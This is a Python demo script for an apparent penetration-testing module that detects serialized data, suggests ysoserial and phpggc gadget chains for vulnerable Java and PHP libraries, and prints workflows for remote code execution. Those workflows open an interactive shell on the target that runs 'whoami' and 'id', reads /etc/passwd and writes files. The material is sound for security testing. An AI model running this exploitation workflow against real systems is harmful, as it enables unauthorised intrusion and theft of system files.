"""Demo script for deserialization exploitation module

This script demonstrates:
1. Detecting serialized data in responses
2. Testing for deserialization vulnerabilities
3. Analyzing dependencies
4. Using the interactive shell
"""

import asyncio
import sys
from pathlib import Path

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from app.modules.deserialization import (
    DeserializationTester,
    SerializedDataDetector,
    DependencyAnalyzer,
    InteractiveShell,
    ProgrammingLanguage,
    SerializationFormat,
)
from app.core.request_handler import RequestHandler
from app.models.target import TargetConfig


async def demo_detection():
    """Demonstrate serialized data detection"""
    print("=" * 60)
    print("DEMO 1: Serialized Data Detection")
    print("=" * 60)
    
    detector = SerializedDataDetector()
    
    # Test Java serialization detection
    java_data = b'\xac\xed\x00\x05'  # Java magic bytes
    java_info = detector.detect_serialized_data(
        java_data,
        location="cookie",
        parameter="session"
    )
    
    if java_info:
        print(f"\n✓ Detected Java serialization")
        print(f"  Format: {java_info.format.value}")
        print(f"  Language: {java_info.language.value}")
        print(f"  Location: {java_info.location}")
        print(f"  Parameter: {java_info.parameter}")
        print(f"  Confidence: {java_info.confidence}")
        print(f"  Indicators: {java_info.indicators}")
    
    # Test PHP serialization detection
    php_data = b'O:8:"stdClass":1:{s:4:"name";s:5:"admin";}'
    php_info = detector.detect_serialized_data(
        php_data,
        location="post",
        parameter="data"
    )
    
    if php_info:
        print(f"\n✓ Detected PHP serialization")
        print(f"  Format: {php_info.format.value}")
        print(f"  Language: {php_info.language.value}")
        print(f"  Location: {php_info.location}")
        print(f"  Parameter: {php_info.parameter}")
        print(f"  Confidence: {php_info.confidence}")
        print(f"  Indicators: {php_info.indicators}")
    
    # Test Python pickle detection
    pickle_data = b'\x80\x03}q\x00(X\x04\x00\x00\x00nameq\x01X\x05\x00\x00\x00adminq\x02u.'
    pickle_info = detector.detect_serialized_data(
        pickle_data,
        location="header",
        parameter="X-Session"
    )
    
    if pickle_info:
        print(f"\n✓ Detected Python pickle")
        print(f"  Format: {pickle_info.format.value}")
        print(f"  Language: {pickle_info.language.value}")
        print(f"  Location: {pickle_info.location}")
        print(f"  Parameter: {pickle_info.parameter}")
        print(f"  Confidence: {pickle_info.confidence}")
        print(f"  Indicators: {pickle_info.indicators}")


async def demo_tool_integration():
    """Demonstrate tool integration"""
    print("\n" + "=" * 60)
    print("DEMO 2: Tool Integration")
    print("=" * 60)
    
    request_handler = RequestHandler()
    tester = DeserializationTester(request_handler)
    
    # Check ysoserial availability
    print(f"\nysoserial available: {tester.ysoserial.is_available()}")
    if tester.ysoserial.is_available():
        print(f"  Path: {tester.ysoserial.ysoserial_path}")
        chains = tester.ysoserial.get_available_chains()
        print(f"  Available chains: {len(chains)}")
        print(f"  Sample chains: {chains[:5]}")
    else:
        print("  ysoserial not found - install from https://github.com/frohoff/ysoserial")
    
    # Check phpggc availability
    print(f"\nphpggc available: {tester.phpggc.is_available()}")
    if tester.phpggc.is_available():
        print(f"  Path: {tester.phpggc.phpggc_path}")
        chains = tester.phpggc.get_available_chains()
        print(f"  Available chains: {len(chains)}")
        print(f"  Sample chains: {chains[:5]}")
    else:
        print("  phpggc not found - install from https://github.com/ambionics/phpggc")


async def demo_dependency_analysis():
    """Demonstrate dependency analysis"""
    print("\n" + "=" * 60)
    print("DEMO 3: Dependency Analysis")
    print("=" * 60)
    
    analyzer = DependencyAnalyzer()
    
    # Analyze Java dependencies
    print("\nJava Dependencies:")
    java_deps = [
        "org.apache.commons:commons-collections:3.2.1",
        "org.springframework:spring-core:4.1.4",
        "com.rometools:rome:1.0",
    ]
    
    exploitable = analyzer.analyze_dependencies(
        ProgrammingLanguage.JAVA,
        java_deps
    )
    
    for lib in exploitable:
        print(f"\n  Library: {lib['library']}")
        print(f"  Vulnerable: {lib['is_vulnerable_version']}")
        print(f"  Description: {lib['description']}")
        print(f"  Suggested chains: {', '.join(lib['gadget_chains'][:3])}")
    
    # Get suggested chains
    suggested = analyzer.suggest_gadget_chains(
        ProgrammingLanguage.JAVA,
        java_deps
    )
    print(f"\n  Priority chains to test: {', '.join(suggested[:5])}")
    
    # Analyze PHP dependencies
    print("\n\nPHP Dependencies:")
    php_deps = [
        "laravel/framework:5.8.0",
        "symfony/symfony:4.1.0",
        "monolog/monolog:2.0",
    ]
    
    exploitable = analyzer.analyze_dependencies(
        ProgrammingLanguage.PHP,
        php_deps
    )
    
    for lib in exploitable:
        print(f"\n  Library: {lib['library']}")
        print(f"  Vulnerable: {lib['is_vulnerable_version']}")
        print(f"  Description: {lib['description']}")
        print(f"  Suggested chains: {', '.join(lib['gadget_chains'][:3])}")


async def demo_exploitation():
    """Demonstrate exploitation testing"""
    print("\n" + "=" * 60)
    print("DEMO 4: Exploitation Testing")
    print("=" * 60)
    
    print("\nNote: This demo shows the exploitation workflow.")
    print("In a real scenario, you would:")
    print("  1. Scan target for serialized data")
    print("  2. Test with appropriate gadget chains")
    print("  3. Use interactive shell if successful")
    
    print("\nExample workflow:")
    print("""
    # Initialize tester
    request_handler = RequestHandler()
    tester = DeserializationTester(request_handler)
    
    # Scan for serialized data
    target = TargetConfig(url="https://vulnerable-app.com")
    response = await request_handler.send_request("GET", target.url)
    detected = await tester.scan_for_serialized_data(target, response)
    
    # Test each detected serialized data
    for data_info in detected:
        result = await tester.test_deserialization(
            target,
            data_info,
            test_command="whoami"
        )
        
        if result.is_vulnerable:
            print(f"Vulnerable!")
            print(f"Chain: {result.successful_gadget_chain.name}")
            print(f"Tested: {len(result.tested_chains)} chains")
            
            # Create interactive shell
            shell = InteractiveShell(
                request_handler,
                target,
                data_info,
                result.successful_gadget_chain
            )
            
            # Execute commands
            cmd_result = await shell.execute_command("id")
            print(cmd_result["response_body"])
            
            # Read files
            file_result = await shell.read_file("/etc/passwd")
            print(file_result["contents"])
    """)


async def demo_interactive_shell():
    """Demonstrate interactive shell capabilities"""
    print("\n" + "=" * 60)
    print("DEMO 5: Interactive Shell")
    print("=" * 60)
    
    print("\nInteractive shell provides:")
    print("  • Command execution")
    print("  • File read/write")
    print("  • Directory listing")
    print("  • Full shell access")
    
    print("\nExample commands:")
    print("""
    # Execute command
    result = await shell.execute_command("whoami")
    print(result["response_body"])
    
    # Read file
    result = await shell.read_file("/etc/passwd")
    print(result["contents"])
    
    # Write file
    result = await shell.write_file("/tmp/test.txt", "Hello!")
    print(result["message"])
    
    # List directory
    result = await shell.list_directory("/tmp")
    print(result["listing"])
    """)


async def main():
    """Run all demos"""
    print("\n" + "=" * 60)
    print("DESERIALIZATION EXPLOITATION MODULE DEMO")
    print("=" * 60)
    
    try:
        await demo_detection()
        await demo_tool_integration()
        await demo_dependency_analysis()
        await demo_exploitation()
        await demo_interactive_shell()
        
        print("\n" + "=" * 60)
        print("DEMO COMPLETE")
        print("=" * 60)
        print("\nFor more information, see:")
        print("  • backend/app/modules/README_DESERIALIZATION.md")
        print("  • backend/app/modules/deserialization.py")
        
    except Exception as e:
        print(f"\nError during demo: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    asyncio.run(main())
